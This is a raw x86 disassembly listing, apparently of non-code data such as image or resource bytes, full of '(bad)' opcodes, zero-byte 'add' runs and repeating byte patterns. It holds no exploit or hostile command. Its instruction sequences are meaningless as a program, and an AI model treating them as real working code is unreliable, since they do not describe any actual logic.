11017180:	mov    eax,ds:0x15ff3b5a
11017185:	adc    DWORD PTR [eax],edx
11017187:	inc    esp
11017189:	(bad)  
1101718d:	(bad)  
1101718e:	std    
1101718f:	(bad)  
11017190:	(bad)  
11017191:	(bad)  
11017192:	std    
11017193:	(bad)  
11017194:	(bad)  
11017195:	(bad)  
11017196:	std    
11017197:	(bad)  
11017198:	(bad)  
11017199:	(bad)  
1101719a:	std    
1101719b:	(bad)  
1101719c:	(bad)  
1101719d:	(bad)  
1101719e:	(bad)  
1101719f:	(bad)  
110171a0:	(bad)  
110171a1:	(bad)  
110171a2:	(bad)  
110171a3:	inc    ebx
110171a5:	ret    
110171a6:	ret    0x15ff
110171a9:	adc    DWORD PTR [eax],edx
110171ab:	jmp    DWORD PTR [edx-0x1300c3a5]
110171b1:	test   DWORD PTR [eax-0x1],ebx
110171b4:	xrelease mov DWORD PTR [edx-0x1],ebx
110171b8:	hlt    
110171b9:	mov    bl,BYTE PTR [ebx-0x1]
110171bc:	hlt    
110171bd:	mov    bl,BYTE PTR [ebx-0x1]
110171c0:	hlt    
110171c1:	mov    bl,BYTE PTR [ebx-0x1]
110171c4:	add    BYTE PTR [eax],al
110171c6:	add    bh,bh
110171c8:	add    BYTE PTR [eax],al
110171ca:	add    BYTE PTR [eax+0x0],bh
110171cd:	add    BYTE PTR [eax],al
110171cf:	aaa    
110171d0:	add    BYTE PTR [eax],al
110171d2:	add    BYTE PTR ds:0x1000000,cl
	...
110171e4:	add    BYTE PTR [eax],al
110171e6:	add    BYTE PTR [esi],al
110171e8:	add    BYTE PTR [eax],al
110171ea:	add    bh,bh
110171ec:	add    BYTE PTR [eax],al
110171ee:	add    bh,bh
110171f0:	add    BYTE PTR [eax],al
110171f2:	add    bh,bh
110171f4:	add    BYTE PTR [eax],al
110171f6:	add    bh,bh
110171f8:	add    BYTE PTR [eax],al
110171fa:	add    bh,bh
110171fc:	add    BYTE PTR [eax],al
110171fe:	add    bh,bh
11017200:	add    BYTE PTR [eax],al
11017202:	add    bh,bh
11017204:	add    BYTE PTR [eax],al
11017206:	add    bh,bh
11017208:	or     eax,0xc3ff0d0d
1101720d:	ret    
1101720e:	ret    
1101720f:	(bad)  
11017210:	std    
11017211:	std    
11017212:	std    
11017213:	(bad)  
11017214:	std    
11017215:	std    
11017216:	std    
11017217:	(bad)  
11017218:	std    
11017219:	std    
1101721a:	std    
1101721b:	(bad)  
1101721c:	(bad)  
1101721d:	(bad)  
1101721e:	(bad)  
1101721f:	inc    ebx
11017221:	ret    
11017222:	ret    
11017223:	dec    DWORD PTR ds:0xff0d0d
11017229:	add    BYTE PTR [eax],al
1101722b:	inc    DWORD PTR [eax]
1101722d:	add    BYTE PTR [eax],al
1101722f:	inc    DWORD PTR [eax]
11017231:	add    BYTE PTR [eax],al
11017233:	inc    DWORD PTR [eax]
11017235:	add    BYTE PTR [eax],al
11017237:	inc    DWORD PTR [eax]
11017239:	add    BYTE PTR [eax],al
1101723b:	inc    DWORD PTR [eax]
1101723d:	add    BYTE PTR [eax],al
1101723f:	inc    DWORD PTR [eax]
11017241:	add    BYTE PTR [eax],al
11017243:	inc    DWORD PTR [eax]
11017245:	add    BYTE PTR [eax],al
11017247:	inc    DWORD PTR [eax]
11017249:	add    BYTE PTR [eax],al
1101724b:	aaa    
1101724c:	add    BYTE PTR [eax],al
1101724e:	add    BYTE PTR [ecx],bl
11017250:	add    BYTE PTR [eax],al
11017252:	add    BYTE PTR [esi],al
	...
11017264:	add    BYTE PTR [eax],al
11017266:	add    BYTE PTR [ecx],al
11017268:	add    BYTE PTR [eax],al
1101726a:	add    BYTE PTR [esi],al
1101726c:	add    BYTE PTR [eax],al
1101726e:	add    BYTE PTR ds:0x11000000,cl
11017274:	add    BYTE PTR [eax],al
11017276:	add    BYTE PTR [ebx],dl
11017278:	add    BYTE PTR [eax],al
1101727a:	add    BYTE PTR [ebx],dl
1101727c:	add    BYTE PTR [eax],al
1101727e:	add    BYTE PTR [ebx],dl
11017280:	add    BYTE PTR [eax],al
11017282:	add    BYTE PTR [ebx],dl
11017284:	add    BYTE PTR [eax],al
11017286:	add    BYTE PTR [edx],bl
11017288:	add    BYTE PTR [eax],al
1101728a:	add    BYTE PTR [eax+0xd],ah
1101728d:	or     eax,0xc3c3f70d
11017292:	ret    
11017293:	(bad)  
11017294:	(bad)  
11017295:	(bad)  
11017296:	(bad)  
11017297:	(bad)  
11017298:	std    
11017299:	std    
1101729a:	std    
1101729b:	inc    ebx
1101729d:	ret    
1101729e:	ret    
1101729f:	dec    BYTE PTR ds:0xf60d0d
110172a5:	add    BYTE PTR [eax],al
110172a7:	pop    edi
110172a8:	add    BYTE PTR [eax],al
110172aa:	add    BYTE PTR [edx],bl
110172ac:	add    BYTE PTR [eax],al
110172ae:	add    BYTE PTR [ebx],dl
110172b0:	add    BYTE PTR [eax],al
110172b2:	add    BYTE PTR [ebx],dl
110172b4:	add    BYTE PTR [eax],al
110172b6:	add    BYTE PTR [ebx],dl
110172b8:	add    BYTE PTR [eax],al
110172ba:	add    BYTE PTR [ebx],dl
110172bc:	add    BYTE PTR [eax],al
110172be:	add    BYTE PTR [ebx],dl
110172c0:	add    BYTE PTR [eax],al
110172c2:	add    BYTE PTR [ebx],dl
110172c4:	add    BYTE PTR [eax],al
110172c6:	add    BYTE PTR [ecx],dl
110172c8:	add    BYTE PTR [eax],al
110172ca:	add    BYTE PTR ds:0x6000000,cl
110172d0:	add    BYTE PTR [eax],al
110172d2:	add    BYTE PTR [ecx],al
	...
110172ec:	add    BYTE PTR [eax],al
110172ee:	add    BYTE PTR [ecx],al
110172f0:	add    BYTE PTR [eax],al
110172f2:	add    BYTE PTR [ecx],al
110172f4:	add    BYTE PTR [eax],al
110172f6:	add    BYTE PTR [ecx],al
110172f8:	add    BYTE PTR [eax],al
110172fa:	add    BYTE PTR [ecx],al
110172fc:	add    BYTE PTR [eax],al
110172fe:	add    BYTE PTR [ecx],al
11017300:	add    BYTE PTR [eax],al
11017302:	add    BYTE PTR [ecx],al
11017304:	add    BYTE PTR [eax],al
11017306:	add    BYTE PTR [edx],al
11017308:	add    BYTE PTR [eax],al
1101730a:	add    BYTE PTR [ecx],cl
1101730c:	add    BYTE PTR [eax],al
1101730e:	add    BYTE PTR [edi+0xd],dl
11017311:	or     eax,0xc4c4f60d
11017316:	(bad)  
11017317:	inc    bl
11017319:	ret    
1101731a:	ret    
1101731b:	dec    BYTE PTR ds:0xf60d0d
11017321:	add    BYTE PTR [eax],al
11017323:	push   esi
11017324:	add    BYTE PTR [eax],al
11017326:	add    BYTE PTR [ecx],cl
11017328:	add    BYTE PTR [eax],al
1101732a:	add    BYTE PTR [edx],al
1101732c:	add    BYTE PTR [eax],al
1101732e:	add    BYTE PTR [ecx],al
11017330:	add    BYTE PTR [eax],al
11017332:	add    BYTE PTR [ecx],al
11017334:	add    BYTE PTR [eax],al
11017336:	add    BYTE PTR [ecx],al
11017338:	add    BYTE PTR [eax],al
1101733a:	add    BYTE PTR [ecx],al
1101733c:	add    BYTE PTR [eax],al
1101733e:	add    BYTE PTR [ecx],al
11017340:	add    BYTE PTR [eax],al
11017342:	add    BYTE PTR [ecx],al
11017344:	add    BYTE PTR [eax],al
11017346:	add    BYTE PTR [ecx],al
11017348:	add    BYTE PTR [eax],al
1101734a:	add    BYTE PTR [ecx],al
	...
11017388:	add    BYTE PTR [eax],al
1101738a:	add    BYTE PTR [ecx],al
1101738c:	add    BYTE PTR [eax],al
1101738e:	add    BYTE PTR [edi],al
11017390:	add    BYTE PTR [eax],al
11017392:	add    BYTE PTR [ebx+0xd],dl
11017395:	or     eax,0xd0df60d
1101739a:	or     eax,0xf5
1101739f:	push   edx
110173a0:	add    BYTE PTR [eax],al
110173a2:	add    BYTE PTR [edi],al
110173a4:	add    BYTE PTR [eax],al
110173a6:	add    BYTE PTR [ecx],al
	...
1101740c:	add    BYTE PTR [eax],al
1101740e:	add    BYTE PTR [ecx],al
11017410:	add    BYTE PTR [eax],al
11017412:	add    BYTE PTR [eax+eax*1],al
11017415:	add    BYTE PTR [eax],al
11017417:	dec    edx
11017418:	add    BYTE PTR [eax],al
1101741a:	add    BYTE PTR [ecx+0x0],cl
1101741d:	add    BYTE PTR [eax],al
1101741f:	add    al,0x0
11017421:	add    BYTE PTR [eax],al
11017423:	add    DWORD PTR [eax],eax
	...
11017455:	add    BYTE PTR [eax],al
11017457:	add    al,bh
11017459:	add    BYTE PTR [eax],al
1101745b:	pop    es
1101745c:	loopne 0x1101745e
1101745e:	add    BYTE PTR [ecx],al
11017460:	loopne 0x11017462
11017462:	add    BYTE PTR [ecx],al
11017464:	rol    BYTE PTR [eax],0x0
11017467:	add    al,al
11017469:	add    BYTE PTR [eax],al
1101746b:	add    al,al
1101746d:	add    BYTE PTR [eax],al
1101746f:	add    al,al
11017471:	add    BYTE PTR [eax],al
11017473:	add    al,al
11017475:	add    BYTE PTR [eax],al
11017477:	add    al,al
11017479:	add    BYTE PTR [eax],al
1101747b:	add    al,al
1101747d:	add    BYTE PTR [eax],al
1101747f:	add    BYTE PTR [eax+0x0],al
	...
110174a1:	add    BYTE PTR [eax],al
110174a3:	add    BYTE PTR [eax-0x40000000],al
110174a9:	add    BYTE PTR [eax],al
110174ab:	add    al,al
110174ad:	add    BYTE PTR [eax],al
110174af:	add    al,al
110174b1:	add    BYTE PTR [eax],al
110174b3:	add    al,al
110174b5:	add    BYTE PTR [eax],al
110174b7:	add    al,al
110174b9:	add    BYTE PTR [eax],al
110174bb:	add    al,al
110174bd:	add    BYTE PTR [eax],al
110174bf:	add    al,al
110174c1:	add    BYTE PTR [eax],al
110174c3:	add    al,ah
110174c5:	add    BYTE PTR [eax],al
110174c7:	add    eax,esp
110174c9:	add    BYTE PTR [eax],al
110174cb:	add    eax,edi
110174cd:	add    BYTE PTR [eax],al
110174cf:	pop    es
110174d0:	push   eax
110174d2:	ud0    edi,edi
110174d5:	clc    
110174d6:	pop    ds
110174d7:	jmp    FWORD PTR [eax]
110174d9:	add    BYTE PTR [eax],al
110174db:	add    BYTE PTR [eax],bl
110174dd:	add    BYTE PTR [eax],al
110174df:	add    BYTE PTR [eax],dh
110174e1:	add    BYTE PTR [eax],al
110174e3:	add    BYTE PTR [ecx],al
110174e5:	add    BYTE PTR [eax],ah
	...
1101750f:	add    DWORD PTR [eax],eax
11017511:	add    BYTE PTR [eax],al
11017513:	add    al,BYTE PTR [eax]
11017515:	add    BYTE PTR [eax],al
11017517:	add    eax,DWORD PTR [eax]
11017519:	add    BYTE PTR [eax],al
1101751b:	add    eax,DWORD PTR [eax]
1101751d:	add    BYTE PTR [eax],al
1101751f:	add    eax,DWORD PTR [eax]
11017521:	add    BYTE PTR [eax],al
11017523:	or     al,BYTE PTR [eax]
11017525:	add    BYTE PTR [eax],al
11017527:	sub    al,BYTE PTR [eax]
11017529:	add    BYTE PTR [eax],al
1101752b:	jae    0x1101752d
1101752d:	add    BYTE PTR [eax],al
1101752f:	enter  0x0,0x0
11017533:	enter  0x0,0x0
11017537:	jae    0x11017539
11017539:	add    BYTE PTR [eax],al
1101753b:	sub    al,BYTE PTR [eax]
1101753d:	add    BYTE PTR [eax],al
1101753f:	or     DWORD PTR [eax],eax
11017541:	add    BYTE PTR [eax],al
11017543:	add    eax,DWORD PTR [eax]
11017545:	add    BYTE PTR [eax],al
11017547:	add    eax,DWORD PTR [eax]
11017549:	add    BYTE PTR [eax],al
1101754b:	add    eax,DWORD PTR [eax]
1101754d:	add    BYTE PTR [eax],al
1101754f:	add    eax,DWORD PTR [eax]
11017551:	add    BYTE PTR [eax],al
11017553:	add    al,BYTE PTR [eax]
11017555:	add    BYTE PTR [eax],al
11017557:	add    al,BYTE PTR [eax]
	...
11017569:	add    BYTE PTR [eax],al
1101756b:	add    al,BYTE PTR [eax]
1101756d:	add    BYTE PTR [eax],al
1101756f:	adc    DWORD PTR [eax],eax
11017571:	add    BYTE PTR [eax],al
11017573:	and    eax,0x2c000000
11017578:	add    BYTE PTR [eax],al
1101757a:	add    BYTE PTR ds:0x32000000,ch
11017580:	add    BYTE PTR [eax],al
11017582:	add    BYTE PTR [eax+eax*1+0x0],cl
11017586:	add    BYTE PTR [eax-0x2c000000],cl
1101758c:	inc    ebp
1101758d:	inc    ebp
1101758e:	inc    ebp
1101758f:	inc    BYTE PTR [esp+eax*2+0x44]
11017593:	inc    BYTE PTR [eax]
11017595:	add    BYTE PTR [eax],al
11017597:	aam    0x0
11017599:	add    BYTE PTR [eax],al
1101759b:	mov    BYTE PTR [eax],al
1101759d:	add    BYTE PTR [eax],al
1101759f:	dec    esp
110175a0:	add    BYTE PTR [eax],al
110175a2:	add    BYTE PTR [edx],dh
110175a4:	add    BYTE PTR [eax],al
110175a6:	add    BYTE PTR ds:0x2c000000,ch
110175ac:	add    BYTE PTR [eax],al
110175ae:	add    BYTE PTR [eax+eax*1],ch
110175b1:	add    BYTE PTR [eax],al
110175b3:	sub    al,BYTE PTR [eax]
110175b5:	add    BYTE PTR [eax],al
110175b7:	sbb    al,0x0
110175b9:	add    BYTE PTR [eax],al
110175bb:	or     BYTE PTR [eax],al
	...
110175c9:	add    BYTE PTR [eax],al
110175cb:	or     DWORD PTR [eax],eax
110175cd:	add    BYTE PTR [eax],al
110175cf:	cmp    al,0x0
110175d1:	add    BYTE PTR [eax],al
110175d3:	add    DWORD PTR [eax],0x0
110175d6:	add    BYTE PTR [eax+eax*1+0xa00000],bl
110175dd:	add    BYTE PTR [eax],al
110175df:	stos   DWORD PTR es:[edi],eax
110175e0:	add    BYTE PTR [eax],al
110175e2:	add    dh,al
110175e4:	add    BYTE PTR [eax],al
110175e6:	add    al,ch
110175e8:	inc    ebp
110175e9:	inc    ebp
110175ea:	inc    ebp
110175eb:	(bad)  
110175ec:	hlt    
110175ed:	hlt    
110175ee:	hlt    
110175ef:	push   ebx
110175f1:	repz repz inc DWORD PTR [esp+eax*2+0x44]
110175f7:	inc    BYTE PTR [eax]
110175f9:	add    BYTE PTR [eax],al
110175fb:	call   0xd7017600
11017600:	add    BYTE PTR [eax],al
11017602:	add    BYTE PTR [ebx-0x60000000],ch
11017608:	add    BYTE PTR [eax],al
1101760a:	add    BYTE PTR [esi-0x62000000],bl
11017610:	add    BYTE PTR [eax],al
11017612:	add    BYTE PTR [esi+0x63000000],dl
11017618:	add    BYTE PTR [eax],al
1101761a:	add    BYTE PTR [eax+eax*1],bl
1101761d:	add    BYTE PTR [eax],al
1101761f:	add    al,BYTE PTR [eax]
	...
11017629:	add    BYTE PTR [eax],al
1101762b:	push   cs
1101762c:	invd   
1101762e:	add    eax,0x16223cff
11017633:	(bad)  
11017634:	cmp    DWORD PTR [eax],esp
11017636:	adc    eax,0x101a2eff
1101763b:	call   FWORD PTR [ecx]
1101763d:	push   cs
1101763e:	or     edi,edi
11017640:	add    al,0x2
11017642:	add    edi,edi
11017644:	inc    ebp
11017645:	inc    ebp
11017646:	inc    ebp
11017647:	push   esp
11017649:	hlt    
1101764a:	hlt    
1101764b:	(bad)  
1101764c:	std    
1101764d:	std    
1101764e:	std    
1101764f:	(bad)  
11017650:	std    
11017651:	std    
11017652:	std    
11017653:	push   esp
11017655:	hlt    
11017656:	hlt    
11017657:	inc    DWORD PTR [esp+eax*2+0x44]
1101765b:	inc    DWORD PTR [edx+eax*1]
1101765e:	add    edi,edi
11017660:	sbb    DWORD PTR [esi],ecx
11017662:	or     edi,edi
11017664:	sbb    dl,BYTE PTR cs:[ecx]
11017667:	(bad)  
11017668:	cmp    DWORD PTR [eax],esp
1101766a:	adc    eax,0x16223cff
1101766f:	dec    DWORD PTR [edi]
11017671:	or     BYTE PTR ds:0xff,al
11017677:	xchg   ebp,eax
11017678:	add    BYTE PTR [eax],al
1101767a:	add    BYTE PTR [edx],ch
1101767c:	add    BYTE PTR [eax],al
1101767e:	add    BYTE PTR [ebx],al
	...
11017688:	add    BYTE PTR [eax],al
1101768a:	add    BYTE PTR [edi],cl
1101768c:	cmp    al,0x22
1101768e:	push   ss
1101768f:	(bad)  
11017690:	in     eax,dx
11017691:	xchg   BYTE PTR [edi-0x1],dl
11017694:	int    0x74
11017696:	dec    ebx
11017697:	inc    DWORD PTR [ebp+0x2eff314b]
1101769d:	sbb    dl,BYTE PTR [ecx]
1101769f:	inc    DWORD PTR [esi+0x46]
110176a2:	inc    ebp
110176a3:	push   ebp
110176a5:	cmc    
110176a6:	hlt    
110176a7:	(bad)  
110176a8:	std    
110176a9:	std    
110176aa:	std    
110176ab:	(bad)  
110176ac:	(bad)  
110176ad:	(bad)  
110176ae:	std    
110176af:	(bad)  
110176b0:	std    
110176b1:	std    
110176b2:	std    
110176b3:	(bad)  
110176b4:	(bad)  
110176b5:	(bad)  
110176b6:	(bad)  
110176b7:	push   esp
110176b9:	hlt    
110176ba:	repz inc DWORD PTR [ebp+0x45]
110176be:	inc    esp
110176bf:	jmp    FWORD PTR [esi]
110176c1:	sbb    dl,BYTE PTR [eax]
110176c3:	inc    DWORD PTR [esi-0x3200ceb5]
110176c9:	je     0x11017717
110176cb:	(bad)  
110176cc:	in     eax,dx
110176cd:	xchg   BYTE PTR [eax-0x1],bl
110176d0:	cmp    al,0x22
110176d2:	push   ss
110176d3:	inc    DWORD PTR [eax]
110176d5:	add    BYTE PTR [eax],al
110176d7:	sahf   
110176d8:	add    BYTE PTR [eax],al
110176da:	add    BYTE PTR [eax+eax*1],ch
110176dd:	add    BYTE PTR [eax],al
110176df:	add    eax,DWORD PTR [eax]
	...
110176e9:	add    BYTE PTR [eax],al
110176eb:	(bad)  
110176ed:	and    BYTE PTR ds:0x4c74ceff,dl
110176f3:	inc    DWORD PTR [esi+0x2eff314b]
110176f9:	sbb    dl,BYTE PTR [eax]
110176fb:	inc    DWORD PTR [esi+0x46]
110176fe:	inc    ebp
110176ff:	push   esp
11017701:	hlt    
11017702:	hlt    
11017703:	(bad)  
11017704:	std    
11017705:	std    
11017706:	std    
11017707:	(bad)  
11017708:	(bad)  
11017709:	(bad)  
1101770a:	std    
1101770b:	(bad)  
1101770c:	std    
1101770d:	std    
1101770e:	std    
1101770f:	(bad)  
11017710:	(bad)  
11017711:	(bad)  
11017712:	std    
11017713:	(bad)  
11017714:	std    
11017715:	std    
11017716:	std    
11017717:	(bad)  
11017718:	std    
11017719:	std    
1101771a:	std    
1101771b:	push   ebx
1101771d:	repz repz inc DWORD PTR [ebp+0x45]
11017722:	inc    esp
11017723:	jmp    FWORD PTR [esi]
11017725:	sbb    dl,BYTE PTR [ecx]
11017727:	inc    DWORD PTR [esi-0x3100ceb5]
1101772d:	je     0x1101777b
1101772f:	(bad)  
11017730:	cmp    DWORD PTR [eax],esp
11017732:	adc    eax,0xff
11017737:	sahf   
11017738:	add    BYTE PTR [eax],al
1101773a:	add    BYTE PTR [eax+eax*1],ch
1101773d:	add    BYTE PTR [eax],al
1101773f:	add    eax,DWORD PTR [eax]
	...
11017749:	add    BYTE PTR [eax],al
1101774b:	adc    eax,0xff101a2e
11017750:	test   DWORD PTR [ebx+0x31],ecx
11017753:	jmp    FWORD PTR [esi]
11017755:	sbb    dl,BYTE PTR [eax]
11017757:	inc    DWORD PTR [esi+0x46]
1101775a:	inc    esi
1101775b:	push   ebp
1101775d:	cmc    
1101775e:	hlt    
1101775f:	(bad)  
11017760:	std    
11017761:	cli    
11017762:	clc    
11017763:	push   ebx
11017765:	ret    
11017766:	mov    al,0xff
11017768:	in     al,0x8c
1101776a:	imul   edi,edi,0xffffffda
1101776d:	ins    DWORD PTR es:[edi],dx
1101776e:	inc    esi
1101776f:	call   esp
11017771:	inc    ax
11017773:	(bad)  
11017774:	fdivr  DWORD PTR [esi+ebx*2-0x1]
11017778:	out    0xb4,eax
1101777a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
1101777b:	(bad)  
1101777c:	cld    
1101777d:	clc    
1101777e:	idiv   edi
11017780:	hlt    
11017781:	hlt    
11017782:	hlt    
11017783:	inc    DWORD PTR [ebp+0x45]
11017786:	inc    esp
11017787:	jmp    FWORD PTR [esi]
11017789:	sbb    DWORD PTR [eax],edx
1101778b:	inc    DWORD PTR [esi+0x2eff314b]
11017791:	sbb    dl,BYTE PTR [ecx]
11017793:	inc    DWORD PTR [eax]
11017795:	add    BYTE PTR [eax],al
11017797:	mov    al,ds:0x2d000000
1101779c:	add    BYTE PTR [eax],al
1101779e:	add    BYTE PTR [ebx],al
110177a0:	add    BYTE PTR [eax],al
110177a2:	add    BYTE PTR [eax],al
110177a4:	add    BYTE PTR [eax],al
110177a6:	add    BYTE PTR [edi],al
110177a8:	add    BYTE PTR [eax],al
110177aa:	add    BYTE PTR [ecx+ebx*1],dh
110177ad:	push   cs
110177ae:	or     edi,edi
110177b0:	sbb    dl,BYTE PTR cs:[ecx]
110177b3:	inc    DWORD PTR [esi+0x46]
110177b6:	inc    ebp
110177b7:	push   ebp
110177b9:	cmc    
110177ba:	cmc    
110177bb:	(bad)  
110177bc:	std    
110177bd:	icebp  
110177be:	in     al,dx
110177bf:	push   eax
110177c1:	call   0xff4f:0x7ce7ff74
110177c8:	loop   0x1101783f
110177ca:	dec    edx
110177cb:	(bad)  
110177cc:	(bad)  [esi+0x44]
110177cf:	(bad)  
110177d0:	fsub   DWORD PTR [edi+0x3f]
110177d3:	call   edx
110177d5:	pop    edi
110177d6:	cmp    bh,bh
110177d8:	int    0x58
110177da:	xor    bh,bh
110177dc:	shl    BYTE PTR [edx+0x54],cl
110177df:	(bad)  
110177e0:	clc    
110177e1:	jmp    0x110177ca
110177e3:	push   esp
110177e5:	hlt    
110177e6:	hlt    
110177e7:	inc    DWORD PTR [ebp+0x45]
110177ea:	inc    esp
110177eb:	jmp    FWORD PTR [esi]
110177ed:	sbb    dl,BYTE PTR [eax]
110177ef:	call   FWORD PTR [ecx]
110177f1:	push   cs
110177f2:	or     edi,edi
110177f4:	add    BYTE PTR [eax],al
110177f6:	add    BYTE PTR [ebx+0x32000000],ch
110177fc:	add    BYTE PTR [eax],al
110177fe:	add    BYTE PTR [ebx],al
11017800:	add    BYTE PTR [eax],al
11017802:	add    BYTE PTR [esi],al
11017804:	add    BYTE PTR [eax],al
11017806:	add    BYTE PTR [eax],ch
11017808:	add    BYTE PTR [eax],al
1101780a:	add    BYTE PTR [ecx+0x4],bh
1101780d:	add    al,BYTE PTR [ecx]
1101780f:	inc    DWORD PTR [esi+0x46]
11017812:	inc    ebp
11017813:	push   esp
11017815:	hlt    
11017816:	hlt    
11017817:	(bad)  
11017818:	std    
11017819:	cli    
1101781a:	clc    
1101781b:	push   ebp
1101781d:	mov    al,ds:0x8af1ff7a
11017822:	pop    esp
11017823:	(bad)  
11017824:	in     eax,dx
11017825:	test   DWORD PTR [eax-0x1],ebx
11017828:	call   0xf500cbab
1101782d:	ja     0x1101787b
1101782f:	(bad)  
11017830:	fisubr WORD PTR [edi+0x46]
11017833:	(bad)  
11017834:	fsub   DWORD PTR [edi+0x3f]
11017837:	call   ebx
11017839:	pusha  
1101783a:	cmp    edi,edi
1101783c:	int    0x58
1101783e:	xor    edi,edi
11017840:	shl    BYTE PTR [edx+0x54],cl
11017843:	(bad)  
11017844:	cld    
11017845:	stc    
11017846:	idiv   edi
11017848:	repz repz repz inc DWORD PTR [ebp+0x45]
1101784e:	inc    esp
1101784f:	inc    DWORD PTR [edx+eax*1]
11017852:	add    edi,edi
11017854:	add    BYTE PTR [eax],al
11017856:	add    dh,al
11017858:	add    BYTE PTR [eax],al
1101785a:	add    BYTE PTR [eax+eax*1+0x0],cl
1101785e:	add    BYTE PTR [ecx],cl
11017860:	add    BYTE PTR [eax],al
11017862:	add    BYTE PTR ds:0x72000000,ah
11017868:	add    BYTE PTR [eax],al
1101786a:	add    al,dl
1101786c:	inc    ebp
1101786d:	inc    ebp
1101786e:	inc    ebp
1101786f:	push   esp
11017871:	hlt    
11017872:	hlt    
11017873:	(bad)  
11017874:	std    
11017875:	std    
11017876:	std    
11017877:	(bad)  
11017878:	stc    
11017879:	int    0xb9
1101787b:	push   ebx
1101787d:	mov    fs,WORD PTR [ecx-0x1]
11017880:	hlt    
11017881:	nop
11017882:	arpl   di,di
11017884:	repnz (bad) 
11017886:	arpl   di,di
11017888:	out    dx,al
11017889:	mov    BYTE PTR [ebp-0x1],bl
1101788c:	jmp    0xf500ce11
11017891:	js     0x110178e1
11017893:	(bad)  
11017894:	fidiv  WORD PTR [eax+0x46]
11017897:	(bad)  
11017898:	fsubr  DWORD PTR [eax+0x3f]
1101789b:	call   ebx
1101789d:	pusha  
1101789e:	cmp    edi,edi
110178a0:	int    0x58
110178a2:	xor    bh,bh
110178a4:	out    0xb4,eax
110178a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110178a7:	(bad)  
110178a8:	std    
110178a9:	std    
110178aa:	std    
110178ab:	push   esp
110178ad:	hlt    
110178ae:	repz inc DWORD PTR [esp+eax*2+0x44]
110178b3:	inc    DWORD PTR [eax]
110178b5:	add    BYTE PTR [eax],al
110178b7:	jmp    0x990178bc
110178bc:	add    BYTE PTR [eax],al
110178be:	add    BYTE PTR [eax],ch
110178c0:	add    BYTE PTR [eax],al
110178c2:	add    BYTE PTR [ebp+0x0],dl
110178c5:	add    BYTE PTR [eax],al
110178c7:	mov    BYTE PTR [ebp+0x45],0x45
110178cb:	(bad)  
110178cc:	cmc    
110178cd:	cmc    
110178ce:	cmc    
110178cf:	(bad)  
110178d0:	(bad)  
110178d1:	(bad)  
110178d2:	std    
110178d3:	(bad)  
110178d4:	(bad)  
110178d5:	(bad)  
110178d6:	(bad)  
110178d7:	push   esi
110178d9:	test   al,0x84
110178db:	push   esp
110178dd:	xchg   ebp,eax
110178de:	imul   edi,edi,0xff6d97f4
110178e4:	hlt    
110178e5:	xchg   edi,eax
110178e6:	ins    DWORD PTR es:[edi],dx
110178e7:	push   ebx
110178e9:	xchg   esp,eax
110178ea:	imul   edi,edi,0xff618bee
110178f0:	jmp    0xf500d077
110178f5:	js     0x11017945
110178f7:	(bad)  
110178f8:	fidiv  WORD PTR [eax+0x46]
110178fb:	(bad)  
110178fc:	fldcw  WORD PTR [eax+0x3f]
110178ff:	call   edx
11017901:	pop    edi
11017902:	cmp    bh,bh
11017904:	fdivr  DWORD PTR [esi+ebx*2-0x1]
11017908:	(bad)  
11017909:	(bad)  
1101790a:	std    
1101790b:	(bad)  
1101790c:	(bad)  
1101790d:	(bad)  
1101790e:	(bad)  
1101790f:	push   esp
11017911:	hlt    
11017912:	hlt    
11017913:	inc    DWORD PTR [esp+eax*2+0x44]
11017917:	inc    BYTE PTR [eax]
11017919:	add    BYTE PTR [eax],al
1101791b:	int3   
1101791c:	add    BYTE PTR [eax],al
1101791e:	add    BYTE PTR [esi+0x0],dl
11017921:	add    BYTE PTR [eax],al
11017923:	test   BYTE PTR [ebp+0x45],al
11017926:	inc    ebp
11017927:	std    
11017928:	hlt    
11017929:	hlt    
1101792a:	hlt    
1101792b:	(bad)  
1101792c:	std    
1101792d:	std    
1101792e:	std    
1101792f:	(bad)  
11017930:	std    
11017931:	std    
11017932:	std    
11017933:	(bad)  
11017934:	std    
11017935:	std    
11017936:	std    
11017937:	push   ebp
11017939:	fwait
1101793a:	jb     0x1101793b
1101793c:	cmc    
1101793d:	lahf   
1101793e:	ja     0x1101793f
11017940:	cmc    
11017941:	mov    ds:0xa2f5ff7d,eax
11017946:	jge    0x11017947
11017948:	cmc    
11017949:	sahf   
1101794a:	ja     0x1101794b
1101794c:	repz cwde 
1101794e:	outs   dx,DWORD PTR ds:[esi]
1101794f:	(bad)  
11017950:	out    dx,eax
11017951:	lea    esp,[edx-0x1]
11017954:	call   0xf500d0da
11017959:	js     0x110179a9
1101795b:	(bad)  
1101795c:	fisubr WORD PTR [edi+0x46]
1101795f:	call   edi
11017961:	addr16 notrack call esp
11017965:	inc    cx
11017967:	(bad)  
11017968:	std    
11017969:	std    
1101796a:	std    
1101796b:	(bad)  
1101796c:	std    
1101796d:	std    
1101796e:	std    
1101796f:	(bad)  
11017970:	std    
11017971:	std    
11017972:	std    
11017973:	push   ebx
11017975:	repz repz inc DWORD PTR [esp+eax*2+0x44]
1101797b:	std    
1101797c:	add    BYTE PTR [eax],al
1101797e:	add    BYTE PTR [eax+eax*1+0x46600000],al
11017985:	inc    esi
11017986:	inc    esi
11017987:	cli    
11017988:	cmc    
11017989:	cmc    
1101798a:	cmc    
1101798b:	(bad)  
1101798c:	std    
1101798d:	std    
1101798e:	std    
1101798f:	(bad)  
11017990:	(bad)  
11017991:	(bad)  
11017992:	std    
11017993:	(bad)  
11017994:	std    
11017995:	std    
11017996:	std    
11017997:	push   esi
11017999:	mov    ds:0xadf7ff7e,eax
1101799e:	mov    edi,?
110179a0:	div    DWORD PTR [esi+edx*4-0x6b4c0801]
110179a7:	push   esi
110179a9:	lods   al,BYTE PTR ds:[esi]
110179aa:	mov    bh,bh
110179ac:	cmc    
110179ad:	mov    ds:0x97f3ff7c,al
110179b2:	outs   dx,BYTE PTR ds:[esi]
110179b3:	(bad)  
110179b4:	out    dx,al
110179b5:	mov    esp,DWORD PTR [eax-0x1]
110179b8:	call   0xf500cf3d
110179bd:	ja     0x11017a0b
110179bf:	(bad)  
110179c0:	(bad)  [esi+0x44]
110179c3:	(bad)  
110179c4:	fisubr DWORD PTR [ebp+0x46]
110179c7:	(bad)  
110179c8:	std    
110179c9:	std    
110179ca:	std    
110179cb:	(bad)  
110179cc:	(bad)  
110179cd:	(bad)  
110179ce:	std    
110179cf:	(bad)  
110179d0:	std    
110179d1:	std    
110179d2:	std    
110179d3:	push   esp
110179d5:	hlt    
110179d6:	hlt    
110179d7:	inc    DWORD PTR [ebp+0x45]
